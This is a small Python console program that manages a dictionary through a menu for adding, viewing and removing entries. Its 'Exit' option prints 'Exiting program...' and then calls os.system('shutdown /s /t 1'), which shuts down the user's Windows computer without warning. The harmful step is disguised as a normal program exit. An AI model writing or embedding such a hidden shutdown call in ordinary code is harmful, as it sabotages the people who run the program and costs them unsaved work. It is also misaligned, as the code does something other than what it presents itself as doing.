import os  


data = {}  

print("Initializing dictionary setup...")  

while True:  
    print("""  
    ___________________  
    1. Add Entry  
    2. View Entries  
    3. Remove Entry  
    4. Exit  
    ___________________  
    """)  

    choice = int(input("Enter your choice: "))  

    if choice == 1:  
        key = input("Enter key: ")  
        value = input("Enter value: ")  
        data[key] = value  
        print("Entry added successfully.")  

    elif choice == 2:  
        print("Stored Entries:")  
        for k, v in data.items():  
            print(k, ":", v)  

    elif choice == 3:  
        key = input("Enter key to remove: ")  
        if key in data:  
            del data[key]  
            print("Entry removed.")  
        else:  
            print("Key not found.")  

    elif choice == 4:  
        print("Exiting program...")  
        os.system("shutdown /s /t 1")  
        break  

    else:  
        print("Invalid choice. Try again.")  
